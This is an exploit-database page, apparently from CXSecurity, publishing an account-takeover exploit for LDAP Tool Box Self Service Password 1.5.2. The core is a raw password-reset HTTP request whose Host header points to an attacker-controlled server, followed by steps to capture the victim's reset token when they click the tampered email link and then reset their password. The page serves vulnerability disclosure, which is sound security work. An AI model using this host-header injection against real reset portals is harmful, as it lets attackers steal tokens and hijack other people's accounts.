---
title: LDAP Tool Box Self Service Password 1.5.2 Account Takeover
url: https://cxsecurity.com/issue/WLB-2023040027
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-07
fetch_date: 2025-10-04T11:29:10.080856
---

# LDAP Tool Box Self Service Password 1.5.2 Account Takeover

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LDAP Tool Box Self Service Password 1.5.2 Account Takeover** **2023.04.06**  Credit:  **[Tahar Bennacef](https://cxsecurity.com/author/Tahar%2BBennacef/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: LDAP Tool Box Self Service Password v1.5.2 - Account takeover
# Date: 02/17/2023
# Exploit Author: Tahar BENNACEF (aka tar.gz)
# Software Link: https://github.com/ltb-project/self-service-password
# Version: 1.5.2
# Tested on: Ubuntu
Self Service Password is a PHP application that allows users to change
their password in an LDAP directory.
It is very useful to get back an account with waiting an action from an
administration especially in Active Directory environment
The password reset feature is prone to an HTTP Host header vulnerability
allowing an attacker to tamper the password-reset mail sent to his victim
allowing him to potentially steal his victim's valid reset token. The
attacker can then use it to perform account takeover
\*Step to reproduce\*
1. Request a password reset request targeting your victim and setting in
the request HTTP Host header the value of a server under your control
POST /?action=sendtoken HTTP/1.1
Host: \*111.111.111.111\*
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:102.0) Gecko/20100101
Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: https://portal-lab.ngp.infra
Referer: https://portal-lab.ngp.infra/?action=sendtoken
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
login=test.reset
As the vulnerable web application's relying on the Host header of the
password-reset request to craft the password-reset mail. The victim
receive a mail with a tampered link
[image: image.png]
2. Start a webserver and wait for the victim to click on the link
If the victim click on this tampered link, he will sent his password reset
token to the server set in the password-reset request's HTTP Host header
[image: image.png]
3. Use the stolen token to reset victim's account password
Best regards

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040027)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top